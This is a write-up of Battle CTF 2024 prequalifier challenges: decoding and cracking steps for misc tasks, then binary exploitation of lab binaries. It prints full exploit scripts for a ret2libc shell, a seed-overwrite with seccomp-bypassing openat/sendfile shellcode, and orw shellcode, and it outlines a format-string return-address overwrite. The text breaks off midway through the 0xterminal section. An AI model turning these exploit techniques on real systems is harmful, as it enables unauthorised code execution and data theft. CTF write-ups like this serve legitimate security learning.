<h3> Battle CTF 2024 </h3>

![image](https://github.com/user-attachments/assets/9d74fbd3-a76b-421c-8247-8630551c826d)

Hii 0x1337 here, this writeup contains the challenges I was able to solve in the Battle CTF 2024 prequalifiers event!

Hope you have fun reading.

Challenges:
- Rules (Misc)
- Invite Code (Misc)
- Do[ro x2] (Forensics)
- Sweet Game (Pwn)
- Universe (Pwn)
- NTCrack (Pwn)
- 0xterminal (Pwn)
- Hmmmm!... (Web)


**Rules**

Going over to the discord channel and checking the #announcement page gives the flag
![image](https://github.com/user-attachments/assets/8ec1e651-47c2-4989-972d-b314bb4801d1)

```
Flag: battleCTF{HereWeGo}
```

**Invite Code**

This challenge was actually released prior to the ctf beginning and you can find it on the discord here
![image](https://github.com/user-attachments/assets/1da6c398-493c-462b-933d-e2758158e7bb)

After decoding from hex it gives this
![image](https://github.com/user-attachments/assets/ab4af42a-ec7c-4093-b78f-cb8f9432e720)

```
UWNYZ1c5dzR3UWQvZWIudXR1b3kvLzpzcHR0aA=https://bugpwn.com/invite.ini
```

There are two things of interest there, one is a base64 encoded value and the other is the invite link path?

Spoiler alert:- The base64 value decodes to a Youtube link which rickrolls you :)

On checking the invite link i got this
![image](https://github.com/user-attachments/assets/64220696-88d8-4479-87c2-0bdd8fd2f6fd)

```
H4sIAKvQ/2YC/02TW08bQQyFn+FXHCKk9iXN3C9SEjS7MytVlIsAqUKKVC1JgJRk0yahTf997VC1fUBMduzj48+eh3eTfTud7OezyV4I+rO795N90MOz/WqJH/PNdrHuRj35QfQw76br2aJ7GvVed4/90MN213azdrnu5qNet+7hbHw8PMlX9d39dcHrlpJxe397Vy5AF2+/V+1+1AuyNz4+Onyhm6Oj4XL9tOi6djUfP7S73XI+3T0OB/8+csi3drv9ud7MxqeqPZXqdD59Xcjl3eri8/nNxY35OjPm5fHq5XoflvP2k9id18/d5WJmlpfp4XkzuH++vt5/Hw7+yrCmmW6+UFObX992Y2FhGygHbxArhIzsISJMRKngJKKBzRAePkNqpIQS4C3qDJcgC3yEVMiHc6BbD9WwZiY1j2IgSFNxLp2DQimQAqlG8tAJFQUbVArJIFloh5KgakgHIRAiUkEVoBREhcZCBtQJQkMr1HR2cBVsQBAoNbyA93CF020N67iia5Ayp9cWkW6ptciapnDpKBAtqgomo2T2HCNiYGMkmA2K4r6oC0r3jkuzKwcpkSp4DeeRBDMhq7pGoHYcQ1OSg73kWjlyjCakZFvAVn+gkckouaiMcBriwIHCBBkjA4Kdk7ImZWKu0VAi9VtQEw3SSYwxVMjNARcdyADhItsNGsO068JVSLPRUILh1wpWcYr1PBobWZBKGIdMIpZjuMeaN4FGT1LUOw8u83Dpig5Bw0rmT1I68HxV4nQq4Wgomb9XtD+aDTMKd+jIss/KMzoteMcItW+4HZqg9LwANDuqSGBpKOTNCd4cc+iXBlFlNA2bTBLaM2eaIyEljFGhoXEHdss2AjNnPsShGg7+33t6hwN+iPRCD/+348lm0g1P+n28vcX6jramuflIy6YE4ez3DxG/AVECNBs5BAAA
```

Decoding it gave this
![image](https://github.com/user-attachments/assets/9224adcf-8fe7-45e4-bce4-b15f9147f49e)

The decoded value is a compressed archive (gzip)

I extracted it
![image](https://github.com/user-attachments/assets/b532ecbf-5d6b-4816-b1b3-e0d5e000a269)

The content is an XML file

```xml
<?xml version="1.0" encoding="utf-8" standalone="no" ?>
<!DOCTYPE users SYSTEM >
<users max="81">
        <user >
                <loginname>battlectf</loginname>
                <password>$2a$12$ecui1lTmMWKRMR4jd44kfOkPx8leaL0tKChnNid4lNAbhr/YhPPxq</password>
                <4cr_encrypt>05 5F 26 74 9B 8D D7 09 49 EB 61 94 5D 07 7D 13 AA E8 75 CD 6A 1E 79 12 DA 1E 8A E7 2F 5F DB 87 E4 0D D2 13 E4 82 EE 10 AC A7 3A BF 54 B2 A4 A5 36 EA 2C 16 00 89 AE B8 22 0B F5 18 CA 03 32 C8 C6 6B 58 80 EC 70 77 6E 16 5C 56 82 6F AD 0B C5 97 69 E9 B8 4E 54 90 95 BB 4D ED 87 99 98 BF EC D4 E2 8A 0D C5 76 03 89 A6 11 AB 73 67 A0 75 AE 3C 84 B6 5D 21 03 71 B8 D9 A0 3B 62 C0 5B 12 DA 5C 91 87 19 63 02 A4 3B 04 9F E0 AD 75 3E 35 C3 FB 1B 5E CB F0 5A A7 8B DF 00 8B DC 88 24 EF F4 EE CE 5C 3B F3 20 10 C2 52 DF 57 D2 59 5E 3E 46 D0 85 10 89 AC 09 07 EF C5 EE 1D 2F 89 1D 83 51 C6 52 38 13 2A D0 20 66 6D 52 B1 93 1B 21 06 9F E5 00 B7 AB 30 EB 98 7F CB 80 17 36 16 EF 73 BB 59 60 E4 4B F0 8A BD FF 85 A1 37 5D 4E C0 91 92 F2 68 C5 20 68 A0 A7 84 EB</4cr_encrypt>
        </user>
</users>\r\n<!-- battleCTF AFRICA 2024 -->\r\n 
```

From the xml content we can see there are 3 fields:
- loginname
- password
- 4cr_encrypt

The last one looks oddly like `rc4_encrypt` so we can assume that we need to rc4 decrypt that hex value, but that requires the key 

Since there's also a password hash we can assume that the rc4 key is the password plaintext value

From this I used JTR to crack the hash and that took time but yea it cracks!
![image](https://github.com/user-attachments/assets/98d209a4-6f0f-4993-9bda-0cd398727621)

The password is `nohara`

At this point I just looked for a rc4 decrypt implementation in python and got [this](https://pycryptodome.readthedocs.io/en/latest/src/cipher/arc4.html)

So we just need to call the `ARC4` class with the password and use the `decrypt` function

Doing that I got the decoded message
![image](https://github.com/user-attachments/assets/45fd9d00-6ebf-4707-8da3-3bdde78de3a7)

```python
from arc4 import ARC4

password = "nohara".encode()
arc4 = ARC4(password)
ct = bytes.fromhex("05 5F 26 74 9B 8D D7 09 49 EB 61 94 5D 07 7D 13 AA E8 75 CD 6A 1E 79 12 DA 1E 8A E7 2F 5F DB 87 E4 0D D2 13 E4 82 EE 10 AC A7 3A BF 54 B2 A4 A5 36 EA 2C 16 00 89 AE B8 22 0B F5 18 CA 03 32 C8 C6 6B 58 80 EC 70 77 6E 16 5C 56 82 6F AD 0B C5 97 69 E9 B8 4E 54 90 95 BB 4D ED 87 99 98 BF EC D4 E2 8A 0D C5 76 03 89 A6 11 AB 73 67 A0 75 AE 3C 84 B6 5D 21 03 71 B8 D9 A0 3B 62 C0 5B 12 DA 5C 91 87 19 63 02 A4 3B 04 9F E0 AD 75 3E 35 C3 FB 1B 5E CB F0 5A A7 8B DF 00 8B DC 88 24 EF F4 EE CE 5C 3B F3 20 10 C2 52 DF 57 D2 59 5E 3E 46 D0 85 10 89 AC 09 07 EF C5 EE 1D 2F 89 1D 83 51 C6 52 38 13 2A D0 20 66 6D 52 B1 93 1B 21 06 9F E5 00 B7 AB 30 EB 98 7F CB 80 17 36 16 EF 73 BB 59 60 E4 4B F0 8A BD FF 85 A1 37 5D 4E C0 91 92 F2 68 C5 20 68 A0 A7 84 EB")

print(arc4.decrypt(ct).decode())
```

And we have the flag!

```
Flag: battleCTF{pwn2live_d7c51d9effacfe021fa0246e031c63e9116d8366875555771349d96c2cf0a60b}
```

**Do[ro x2]**

This is the solution in pdf format: [solution](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/battlectf24/Dororo/Dororo.pdf)

**Poj**

We are given an executable, and checking the file type and protections enabled on it shows this
![image](https://github.com/user-attachments/assets/876eb265-ca59-4e9b-9da0-f07d02af3a4c)

So this is a 64 bits binary which is dynamically linked and stripped

From the result of `checksec` we can see:
- NX is enabled
- PIE is enabled

I ran it to get an overview of what it does but i got this
![image](https://github.com/user-attachments/assets/303204c0-50d8-4765-a3c2-ff9a8123eb58)

I didn't know why i was getting this error so instead i just went ahead to decompile it

Here's the main function
![image](https://github.com/user-attachments/assets/37704d82-bc4e-48a5-b1ea-480fd2646c9d)

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  write(1, "Africa battle CTF 2024\n", 0x17uLL);
  printf("Write() address : %p\n", &write);
  return sub_115C();
}
```

We can see it would give us a libc leak for the write function then calls function `sub_115C`

Here's the decompilation
![image](https://github.com/user-attachments/assets/a0094c5e-6505-401f-9253-274c3ec6fbc1)

```c
ssize_t sub_115C()
{
  _BYTE buf[64]; // [rsp+0h] [rbp-40h] BYREF

  return read(0, buf, 0x100uLL);
}
```

We can see an obvious buffer overflow because it's reading at most `0x100` bytes into a buffer that can only hold up `64` bytes of data

This means the offset from the buffer to the saved return address is `64 + 8 = 72`

From this point to get the libc base we just subtract the libc leak of write with the offset of write@libc

And with the libc base we can just go ahead with ROP

Since i couldnt debug remotely i just went ahead exploiting it on the remote instance

Here's my solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/battlectf24/Poj/solve.py)

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('poj')
libc = ELF("./libc.so.6")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    io.recvuntil("address :")
    libc.address = int(io.recvline().strip(), 16) - libc.sym["write"]
    pop_rdi = libc.address + 0x0000000000028215 # pop rdi ; ret
    ret = libc.address + 0x000000000002668c # ret
    sh = next(libc.search(b'/bin/sh\x00'))
    system = libc.sym["system"]

    offset = 64 + 8

    payload = flat({
        offset: [
            pop_rdi,
            sh,
            ret,
            system
        ]
    })

    io.sendline(payload)

    io.interactive()


def main():
    
    init()
    solve()


if __name__ == '__main__':
    main()
```

Running it works!
![image](https://github.com/user-attachments/assets/f67c40bc-2935-4ef2-9ef9-479ca4d9164c)

```
Flag: battleCTF{Libc_J0P_b4s1c_000_bc8a769d91ae062911c32829608e7d547a3f54bd18c7a7c2f5cc52bd}
```

**Sweet Game**

We are given an executable, and checking the file type and protections enabled on it shows this
![image](https://github.com/user-attachments/assets/3abfd42e-c882-4715-9f41-bbf6fc669ccf)

So this is a 64 bits binary which is dynamically linked and stripped

From the result of `checksec` we can see:
- Full RELRO
- NX is enabled
- PIE is enabled

Ok next thing I did was to run it so as to get a general overview of what it does
![image](https://github.com/user-attachments/assets/f734009c-18c2-4e8c-b007-7d2c151de02c)

We see it prints out some banner thingy, receives our name and expects a secret code

With this I threw the binary into IDA and here's the main function
![image](https://github.com/user-attachments/assets/269c3186-64e2-47af-8f88-9cbe57d37c77)

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  __int64 v4; // [rsp+8h] [rbp-28h] BYREF
  char buf[10]; // [rsp+16h] [rbp-1Ah] BYREF
  unsigned int seed[3]; // [rsp+20h] [rbp-10h]
  int i; // [rsp+2Ch] [rbp-4h]

  *(_QWORD *)seed = time(0LL);
  sub_1209(0LL, a2);
  printf("\nEnter your name to access the system: ");
  fflush(stdout);
  read(0, buf, 0x50uLL);
  printf("\nWelcome Alien %s\nEnter the secret code to proceed: ", buf);
  fflush(stdout);
  __isoc99_scanf("%s", &v4);
  srand(seed[0]);
  if ( v4 == 0x69747563737975LL )
  {
    puts("\nCorrect Secret code..");
    puts("Welcome in the game space.\n");
    for ( i = 0; i <= 69; ++i )
    {
      if ( !(unsigned int)sub_126A() )
      {
        puts("Bye bye!");
        return 0LL;
      }
    }
    sub_150D();
  }
  else
  {
    puts("\nWrong Secret ..!");
  }
  return 0LL;
}
```

I won't explain in details what it does but the basic idea is this:
- Initializes a seed which is based on the current time
- Reads in at most 50 bytes of data into a buffer that can only hold up 10 bytes
- Reads in the secret code
- Calls srand with the seed so it's basically seeding with the current time
- Casts the secret code provided as a long and compares it against a hardcoded value: 0x69747563737975LL
- Based on if the code provided is right it would do another thing else it prints the error message

From this there are two obvious vulnerability:
- Buffer overflow via read()
- Buffer overflow via scanf()

I actually ignored it for now to know what would happen if we pass the comparism

So once we pass the check we get into this:

```c
   puts("\nCorrect Secret code..");
    puts("Welcome in the game space.\n");
    for ( i = 0; i <= 69; ++i )
    {
      if ( !(unsigned int)sub_126A() )
      {
        puts("Bye bye!");
        return 0LL;
      }
    }
    sub_150D();
  }
```

Basically it would loop 70 times and if after calling `sub_126A()` it doesn't return `1` it would print the error message then `returns`

Here's function `sub_126A` decompilation
![image](https://github.com/user-attachments/assets/9d22f744-5458-4b0a-8e05-acf933573e2e)

```c
__int64 sub_126A()
{
  _QWORD v1[21]; // [rsp+0h] [rbp-B0h]
  int v2; // [rsp+A8h] [rbp-8h] BYREF
  int v3; // [rsp+ACh] [rbp-4h]

  v1[0] = "1: Reach for the stars; you might just catch one!";
  v1[1] = "2: Ignite the cosmic flame within you!";
  v1[2] = "3: Celestial traveler, let's have some interstellar fun!";
  v1[3] = "4: Ready to embark on an astronomical journey?";
  v1[4] = "5: Buckle up, it's time for a cosmic adventure!";
  v1[5] = "6: You're about to enter a universe of possibilities.";
  v1[6] = "7: Get ready for an amazing celestial experience!";
  v1[7] = "8: Welcome, let's launch this cosmic party!";
  v1[8] = "9: Exciting times await in the vast cosmos, welcome aboard!";
  v1[9] = "10: Your journey through the galaxies begins now!";
  v1[10] = "11: Step into the cosmos of possibilities.";
  v1[11] = "12: Join the cosmic fun and enjoy the interstellar ride!";
  v1[12] = "13: The journey to the stars begins with you!";
  v1[13] = "14: Prepare for a fantastic astral experience.";
  v1[14] = "15: Welcome to the universe of endless possibilities.";
  v1[15] = "16: The cosmic stage is yours, shine like a supernova!";
  v1[16] = "17: Time to shine bright like distant stars and have some fun!";
  v1[17] = "18: Embrace the astronomical adventure that lies ahead.";
  v1[18] = "19: You're in for a celestial treat!";
  v1[19] = "20: The cosmic fun starts now!";
  printf("\nGuess the next alien quote number.\nChoose a number from 1 to 20:");
  fflush(stdout);
  __isoc99_scanf("%d", &v2);
  if ( v2 > 0 && v2 <= 20 )
  {
    v3 = (rand() + 8) % 20 + 1;
    printf("\nQuote | %s\n", (const char *)v1[v3]);
    if ( v3 == v2 )
    {
      puts("\nYou win.");
      return 1LL;
    }
    else
    {
      puts("\nYou lost.");
      return 0LL;
    }
  }
  else
  {
    puts("Invalid value!");
    return 0LL;
  }
}
```

Basically we just need to guess the right choice, and that's computed using a value returned from calling `rand()`

Ok good, remember that it seeds with the current time this means if we know the seed then we can also generate any value that's going to be returned from calling `rand()`

Recall from the first read that we can cause an overflow so we would make use of the overflow to do a variable overwrite

Basically we would overwrite the seed with a known value like 0 and then any future call to `rand()` we would also be able to predict it

The offset between the first buffer and the seed variable is:

```
(rbp-0x1A) - (rbp-0x10) = 0xa
```

So this means if we fill up the name buffer with 10 bytes the next byte is going to be the seed variable on the stack

Here's confirmation
![image](https://github.com/user-attachments/assets/a9387b6b-63b0-4572-ac00-163226b65dac)

The next thing is to guess the right secret code

If we decode that value we'd get this: `itucsyu`

But we need to reverse the string due to endianess

With that we'd get to the next check
![image](https://github.com/user-attachments/assets/e8d5ff15-8497-4fca-ae10-70f96b4edc59)

Now we have right seed we can easily predict the value to `rand()` and guess the right calculated value

Ok the next thing after that is that it would call function `sub_150D`
![image](https://github.com/user-attachments/assets/d145e903-64cb-4d3d-9635-f6f2f5b40667)

```c
__int64 sub_150D()
{
  void *s; // [rsp+8h] [rbp-8h]

  s = mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL);
  memset(s, 0, 0x1000uLL);
  fflush(stdout);
  printf("Give us your feedbacks for this game: ");
  fflush(stdout);
  read(0, s, 0x25DuLL);
  sub_1457();
  return (s)(0LL);
}
```

Seems this is our goal because it would create a memory region with `rwx` permission then sets the first `0x1000` bytes to null and reads into the memory our input which it later on executes the value stored there

So we would need to put shellcode in there so that it's going to be executed

But before that it calls function `sub_1457`, let us take a look at it
![image](https://github.com/user-attachments/assets/a66f83a7-7d86-43e7-8230-13ae412dad5e)

```c
__int64 sub_1457()
{
  __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = seccomp_init(0x7FFF0000LL);
  if ( !v1 )
    exit(0);
  seccomp_rule_add(v1, 0LL, 2LL, 0LL);
  seccomp_rule_add(v1, 0LL, 59LL, 0LL);
  seccomp_rule_add(v1, 0LL, 322LL, 0LL);
  seccomp_rule_add(v1, 0LL, 1LL, 0LL);
  return seccomp_load(v1);
}
```

Basically this initializes a seccomp rule that blocks syscall with sys_number as:
- 0x2 -> open
- 0x3b -> execve
- 0x142 -> execveat
- 0x1 -> write

So we are not allowed to use those blacklisted syscalls

Since we can't spawn a shell i decided to do orw shellcode

Basically i'll open the flag, read the content and write the content

Notice how it blocks `open & write` 

That isn't a problem as there are other alternative to that

In my case i went with:
- openat
- sendfile

This is my final [exploit](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/battlectf24/Sweet%20Game/solve.py)

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from ctypes import CDLL
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('sweet_game')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
breakrva 0x1660
breakrva 0x15B2
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
    code = "uyscuti"
    io.sendlineafter(b"system:", b"A"*0xa + p32(0x0))
    io.sendlineafter(b"proceed:", code.encode())
    libc.srand(0)

    for i in range(70):
        valid = (libc.rand() + 8) % 20 + 1
        io.sendlineafter(b"1 to 20:", str(valid).encode())


    shellcode = shellcraft.linux.openat(-100, "flag.txt")
    shellcode += shellcraft.linux.sendfile(1, 'rax', 0, 500)
    
    io.sendline(asm(shellcode))

    io.interactive()


def main():
    
    init()
    solve()


if __name__ == '__main__':
    main()
```

Running it works!
![image](https://github.com/user-attachments/assets/1b160b6d-28b0-4112-9288-43cf8ae0cee5)

It also works on the remote instance
![image](https://github.com/user-attachments/assets/209ad47f-209b-4ef8-9744-3115227d54d8)

During the time I solved it i didn't overwrite the seed variable because it uses the current time, so i just ran it multiple times till the point that my current time matches that on remote, the other process remains the same!

```
Flag: battleCTF{TimeRand_hijack2Secc0mpF1!t3rBypass_3965657b94b0a5129710dc275f6d98e427be1aa1b83b448445e0329cf3f7e4e1}
```

**Universe**

We are given an executable, and checking the file type and protections enabled on it shows this
![image](https://github.com/user-attachments/assets/7c05a5f9-8bb0-4eb5-af40-32ee51b332c5)

So this is a 64 bits binary which is dynamically linked and stripped

From the result of `checksec` we can see:
- NX is enabled
- PIE is enabled

As usual i ran it to get an overview of what it does
![image](https://github.com/user-attachments/assets/1a475bc6-db54-4ba0-b8d0-bab4e108630c)

Seems to do nothing other than receive our input?

In any case i'll decompile it to figure that out

Here's the main function
![image](https://github.com/user-attachments/assets/6413f73b-e6fc-41d0-8475-1fba5665de41)

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  FILE *v3; // rdi
  void (__fastcall *v5)(FILE *); // [rsp+10h] [rbp-10h]
  int v6; // [rsp+1Ch] [rbp-4h]

  v6 = 0;
  v5 = mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL);
  puts("Africa battleCTF 2024");
  puts(
    "By its very subject, cosmology flirts with metaphysics. Because how can we study an object from which we cannot extr"
    "act ourselves? Einstein had this audacity and the Universe once again became an object of science. Without losing it"
    "s philosophical dimension.\n"
    "What do you think of the universe?");
  v3 = stdout;
  fflush(stdout);
  sub_1208(v3);
  while ( v6 != 4096 )
  {
    v3 = 0LL;
    v6 += read(0, v5 + v6, 4096 - v6);
  }
  v5(v3);
  return 0LL;
}
```

Basically it creates a memory region with `rwx` permission then it calls function `sub_1208` and while the length of that memory isn't up to `4096` bytes it would keep on reading in the data from stdin and after that it executes the value stored into that memory region

Here's the decompilation for `sub_1208`
![image](https://github.com/user-attachments/assets/55bfb5f5-e163-427f-bed0-d04156667947)

```c
__int64 sub_1208()
{
  qword_4078 = seccomp_init(2147418112LL);
  if ( !qword_4078 )
  {
    seccomp_reset(0LL, 2147418112LL);
    _exit(-1);
  }
  seccomp_arch_add(qword_4078, 3221225534LL);
  sub_11C9(2LL);
  sub_11C9(56LL);
  sub_11C9(57LL);
  sub_11C9(58LL);
  sub_11C9(59LL);
  sub_11C9(85LL);
  sub_11C9(322LL);
  return seccomp_load(qword_4078);
}
```

It does some seccomp initialization, this time around i made use of `seccomp-dump` to know the rules applied
![image](https://github.com/user-attachments/assets/119c2908-edfe-468a-841a-784a4f775bd2)

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013
 0005: 0x15 0x07 0x00 0x00000002  if (A == open) goto 0013
 0006: 0x15 0x06 0x00 0x00000038  if (A == clone) goto 0013
 0007: 0x15 0x05 0x00 0x00000039  if (A == fork) goto 0013
 0008: 0x15 0x04 0x00 0x0000003a  if (A == vfork) goto 0013
 0009: 0x15 0x03 0x00 0x0000003b  if (A == execve) goto 0013
 0010: 0x15 0x02 0x00 0x00000055  if (A == creat) goto 0013
 0011: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0013
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KILL
```

We see that it would allow any syscall aside the ones blacklisted

I solve this one using yet orw shellcode

Here's my solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/battlectf24/Universe/solve.py)

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('universe')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
breakrva 0x136E
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():


    shellcode = asm(shellcraft.linux.openat(-1, "/flag.txt"))
    shellcode += asm(shellcraft.linux.sendfile(1, 'rax', 0, 500))
    shellcode = shellcode.ljust(4096, asm("nop"))

    io.sendline(shellcode)

    io.interactive()


def main():
    
    init()
    solve()


if __name__ == '__main__':
    main()
```

Running it works!
![image](https://github.com/user-attachments/assets/9b850220-73c0-4eef-a262-d463414c2cfc)

```
Flag: battleCTF{Are_W3_4l0ne_!n_7he_univ3rs3?_0e2899c65e58d028b0f553c80e5d413eeefef7af987fd4181e834ee6}
```

**NTcrack**

Doing the usual checks we get this
![image](https://github.com/user-attachments/assets/1350b14f-2cdc-4794-9a06-11fe877dc787)

From the result of `checksec` we can see:
- Full RELRO
- NX is enabled
- PIE is enabled

Running it to get an overview of what it does shows this
![image](https://github.com/user-attachments/assets/4c82d2c6-0129-4caf-8a23-c37e2981876f)

We see it just receives our input, prints it out and repeats

I decompiled the binary and here's the main function
![image](https://github.com/user-attachments/assets/e217c05d-8486-43c2-ae03-e6441d012061)

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[512]; // [rsp+0h] [rbp-200h] BYREF

  printf("\nEntrez le hash NTLM : ");
  fgets(s, 512, _bss_start);
  s[strcspn(s, "\n")] = 0;
  if ( s[0] )
  {
    printf(s);
    return curl_ntlm_pw(s);
  }
  else
  {
    puts("No hash was provided. Exiting the program.");
    return 1;
  }
}
```

We can see it receives our input and then if it's successful it prints it out and then call the `curl_ntlm_pw` function passing our input as the first parameter

The bug here is obvious and it's a format string bug

The `curl_ntlm_pw()` function after it's done returns back to `main`
![image](https://github.com/user-attachments/assets/a5dd03cf-061a-4c07-89ff-77d8342cf6a4)

```c
int __fastcall curl_ntlm_pw(const char *a1)
{
  __int64 v2; // rax
  int v3; // edi
  const char **v4; // rdx
  char v5[1008]; // [rsp+10h] [rbp-470h] BYREF
  char s[104]; // [rsp+400h] [rbp-80h] BYREF
  unsigned int v7; // [rsp+468h] [rbp-18h]
  int v8; // [rsp+46Ch] [rbp-14h]
  int v9; // [rsp+470h] [rbp-10h]
  int v10; // [rsp+474h] [rbp-Ch]
  __int64 v11; // [rsp+478h] [rbp-8h]

  memset(v5, 0, 0x3E8uLL);
  v11 = curl_easy_init();
  if ( v11 )
  {
    snprintf(s, 0x64uLL, "https://ntlm.pw/%s", a1);
    v10 = 10002;
    curl_easy_setopt(v11, 10002LL, s);
    v9 = 20011;
    curl_easy_setopt(v11, 20011LL, write_callback);
    v8 = 10001;
    curl_easy_setopt(v11, 10001LL, v5);
    v7 = curl_easy_perform(v11);
    if ( v7 )
    {
      v2 = curl_easy_strerror(v7);
      fprintf(stderr, aErreurLorsDeLa, v2);
      curl_easy_cleanup(v11);
    }
    v5[strcspn(v5, "\n")] = 0;
    printf(" : %s\n", v5);
    v3 = v11;
    curl_easy_cleanup(v11);
    return main(v3, (const char **)v5, v4);
  }
  else
  {
    fwrite("Erreur lors de l'initialisation de Curl\n", 1uLL, 0x28uLL, stderr);
    return 1;
  }
}
```

So this means we have an infinite call to `printf`

Now how do we solve this?

The first thing once would think of is a GOT overwrite, but that isn't possible in this scenerio because we have Full RELRO and this mitigation makes the global offset table `read-only`
![image](https://github.com/user-attachments/assets/59a65383-e761-42f8-9873-6d5d51aee6b0)

So what now?

Well we can make `main` return by not giving it any value and from the current stack frame of the main function it's return address is stored on the stack

So if we overwrite that return address on the stack to any function we hence have control flow over the program

Our goal is to:
- leak libc
- leak stack address
- leverage the format string bug to gain arbitrary write
- overwrite the saved rip on the stack with our ropchain

I don't want to go through my debugging procedure cause it's stressful but that's the idea

One thing to note is that my local solve differ from remote and this is due to the addresses on the stack we leak

They are at various offsets

To fix that i made use of the docker file provided to build a container which is the same as the remote instance and debugged to get right offset

This is my local solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/battlectf24/NTCrack/local.py)
![image](https://github.com/user-attachments/assets/a5d47326-a3ca-4e61-a496-01cb21bf79d0)

And this is my remote [solve](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/battlectf24/NTCrack/remote.py)
![image](https://github.com/user-attachments/assets/e4924705-4901-4224-9cfa-c0a7131ab02f)

Seems the remote is down so let us try it on the docker i built based on the Dockerfile provided
![image](https://github.com/user-attachments/assets/c145f9a9-d4ee-4b9f-84d0-b0bd3441d44a)

Also note that instead of using a ropchain i just used a one gadget as that's easier and the only constraint i had to fix was setting rbx to 0
![image](https://github.com/user-attachments/assets/2b2afd85-5097-4ea1-8b83-67a767d564de)

```
Flag:
```

**0xterminal**

As usual i checked the file type & protections enabled
![image](https://github.com/user-attachments/assets/404b789b-f751-478a-9511-89d1a67c94a2)

So this time we are dealing with a x86 executable and the only protection enabled is NX

Running it i got this
![image](https://github.com/user-attachments/assets/cb399213-3304-4f1e-9679-5a494bd19373)

Looks like a command line interface tool

I went ahead to decompile the binary and here's the main function
![image](https://github.com/user-attachments/assets/a790062c-2096-45b9-8a72-d073535b358a)

```c
int real_main()
{
  char *v1; // [esp+0h] [ebp-18h]
  const char *v2; // [esp+4h] [ebp-14h]
  const char *s1; // [esp+8h] [ebp-10h]
  char *v4; // [esp+Ch] [ebp-Ch]

  sub_804968C();
  while ( 1 )
  {
    while ( 1 )
    {
      do
      {
        fflush(stdout);
        printf("\x1B[0;32mCLI@RAVEN\x1B[0;37m# ");
        fflush(stdout);
        sub_8049648();
        v4 = strchr(byte_804C060, 10);
        if ( v4 )
          *v4 = 0;
        s1 = strtok(byte_804C060, " ");
      }
      while ( !s1 );
      v2 = strtok(0, " ");
      v1 = strtok(0, " ");
      if ( strcmp(s1, "show") )
        break;
      if ( strcmp(v2, "all") || v1 )
      {
        if ( strcmp(v2, "up") || v1 )
        {
          if ( strcmp(v2, "down") || v1 )
          {
            if ( strcmp(v2, "logs") || v1 )
            {
              if ( strcmp(v2, "help") || v1 )
LABEL_26:
                puts("Invalid command. Type 'show help' for available commands.");
              else
                sub_80495A0();
            }
            else
            {
              sub_80494E3();
            }
          }
          else
          {
            sub_804939C();
          }
        }
        else
        {
          sub_8049255();
        }
      }
      else
      {
        sub_8049226();
      }
    }
    if ( strcmp(s1, "clear") )
      break;
    sub_8049722();
  }
  if ( strcmp(s1, "exit") )
    goto LABEL_26;
  puts("Exiting...");
  return 0;
}
```

Function `sub_8049648` handles the command provided
![image](https://github.com/user-attachments/assets/a1a2bb62-c542-4ba2-9c33-0ce8648a0613)

```c
char *sub_8049648()
{
  char buf[54]; // [esp+Eh] [ebp-3Ah] BYREF

  read(0, buf, 200);
  return strcpy(byte_804C060, buf);
}
